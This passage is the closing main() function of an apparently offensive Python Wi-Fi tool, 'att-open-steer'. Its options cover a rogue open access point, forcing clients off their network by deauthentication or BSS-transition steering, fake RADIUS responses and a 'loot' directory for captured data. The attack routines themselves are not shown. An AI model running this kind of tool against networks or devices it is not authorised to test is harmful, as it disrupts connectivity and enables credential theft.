    p = argparse.ArgumentParser()
    p.add_argument("--isolate", dest="isolate", action="store_true", default=False,
                   help="put wlan0open on a dedicated br-att (192.168.99.0/24); "
                        "default is no-isolate (phone on br-lan with the Pager's "
                        "dnsmasq)")
    p.add_argument("--no-isolate", dest="isolate", action="store_false")
    p.add_argument("--steer-mode", default="btm",
                   choices=["btm", "deauth", "both", "off"])
    p.add_argument("--steer-always", action="store_true")
    p.add_argument("--steer-after", type=int, default=20)
    p.add_argument("--steer-interval", type=int, default=8)
    p.add_argument("--disassoc-timer", type=int, default=5)
    p.add_argument("--max-steer-attempts", type=int, default=6)
    p.add_argument("--radius-mode", default="broken",
                   choices=["broken", "log-only", "reject", "accept", "sweep"])
    p.add_argument("--loot-dir", default=LOG_DIR)
    p.add_argument("--force", action="store_true")
    args = p.parse_args()

    run_id = datetime.now().strftime("%Y%m%d-%H%M%S")
    args.run_dir = os.path.join(args.loot_dir, f"run-{run_id}")
    os.makedirs(args.run_dir, exist_ok=True)
    log_fp = open(os.path.join(args.run_dir, "run.log"), "a", buffering=1)
    log(f"att-open-steer starting isolate={args.isolate} "
        f"steer-mode={args.steer_mode} radius-mode={args.radius_mode}", log_fp)

    if not args.force:
        try:
            assert_safe_shell()
        except SystemExit:
            log("[FATAL] SSH-source check failed", log_fp)
            log_fp.close()
            sys.exit(2)

    def _on_signal(signum, frame):
        log(f"[signal] {signum}", log_fp)
        cleanup(args, log_fp)
        sys.exit(0)

    signal.signal(signal.SIGINT, _on_signal)
    signal.signal(signal.SIGTERM, _on_signal)
    signal.signal(signal.SIGHUP, _on_signal)
    atexit.register(lambda: cleanup(args, log_fp))

    rc = 0
    try:
        rc = run(args, log_fp)
    except Exception as e:
        log(f"[fatal] {e}", log_fp)
        rc = 1
    finally:
        cleanup(args, log_fp)
        log_fp.close()
    return rc


if __name__ == "__main__":
    sys.exit(main())
